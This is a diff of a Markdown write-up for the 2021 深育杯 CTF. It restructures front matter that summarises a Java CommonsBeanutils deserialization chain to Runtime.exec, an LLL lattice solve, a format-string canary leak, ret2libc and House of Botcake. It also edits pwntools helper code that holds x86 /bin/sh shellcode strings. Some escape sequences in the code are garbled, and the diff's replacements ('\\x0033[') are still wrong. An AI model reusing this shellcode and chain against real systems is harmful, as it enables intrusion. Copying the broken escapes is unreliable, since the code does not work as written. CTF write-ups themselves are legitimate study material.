@@ -11,7 +11,12 @@ tags:
 - LLL格密码
 - fmtstr泄露canary+elfbase
 - House of Botcake
-attack_chain: Web:weblog CommonsBeanutils+TemplatesImpl Javassist动态类Runtime.exec→Crypto:LLL格密码(grid=[[1,h],[0,p]])+f=gcd→m=a*inverse_mod(f*f,g)%g→PWN:fmtstr泄canary+elfbase→ret2libc+House of Botcake
+attack_chain:
+- 'Web:weblog CommonsBeanutils+TemplatesImpl Javassist动态类Runtime.exec'
+- 'Crypto:LLL格密码(grid=[[1,h],[0,p]])+f=gcd'
+- 'm=a*inverse_mod(f*f,g)%g'
+- 'PWN:fmtstr泄canary+elfbase'
+- 'ret2libc+House of Botcake'
 key_payload: BeanComparator(null, String.CASE_INSENSITIVE_ORDER);setFieldValue(templates, '_bytecodes', targetByteCodes);v1=vector(ZZ, [1, h]);v2=vector(ZZ, [0, p]);grid.LLL();'%17$llx, %15$llx' canary+elfbase
 one_liner: 深育杯多方向：Java反序列化CommonsBeanutils+LLL格密码+fmtstr泄canary+elfbase+ret2libc
 lesson: CommonsBeanutils+TemplatesImpl+Javassist动态类是Java反序列化经典链；LLL格密码二维向量构造
@@ -58,6 +63,8 @@ prerequisites:
 - Sage LLL 算法（matrix.LLL）
 - 格式化字符串漏洞（%n$x 读取参数）
 - 栈保护 canary 绕过
+contest_normalized: "深育杯"
+contest_year: 2021
 ---
 # 深育杯-WriteUp
 
@@ -196,9 +203,9 @@ r       = lambda numb=4096          :p.recv(numb)
 ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
 it      = lambda                    :p.interactive()
 uu32    = lambda data   :
-u32(data.ljust(4, ' '))
+u32(data.ljust(4, '\\x00'))
 uu64    = lambda data   :
-u64(data.ljust(8, ' '))
+u64(data.ljust(8, '\\x00'))
 bp      = lambda bkp                :
 pdbg.bp(bkp)
 li      = lambda str1,data1         :
@@ -209,7 +216,7 @@ def dbgc(addr):
  gdb.attach(p,"b*" + hex(addr) +"n c")
 
 def lg(s,addr):
-    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(s,addr))
+    print('\\x0033[1;31;40m%20s-->0x%x\\x0033[0m'%(s,addr))
 
 sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
 sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
@@ -322,9 +329,9 @@ r       = lambda numb=4096          :p.recv(numb)
 ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
 it      = lambda                    :p.interactive()
 uu32    = lambda data   :
-u32(data.ljust(4, ' '))
+u32(data.ljust(4, '\\x00'))
 uu64    = lambda data   :
-u64(data.ljust(8, ' '))
+u64(data.ljust(8, '\\x00'))
 bp      = lambda bkp                :
 pdbg.bp(bkp)
 li      = lambda str1,data1         :
@@ -335,7 +342,7 @@ def dbgc(addr):
  gdb.attach(p,"b*" + hex(addr) +"n c")
 
 def lg(s,addr):
-    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(s,addr))
+    print('\\x0033[1;31;40m%20s-->0x%x\\x0033[0m'%(s,addr))
 
 sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
 sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
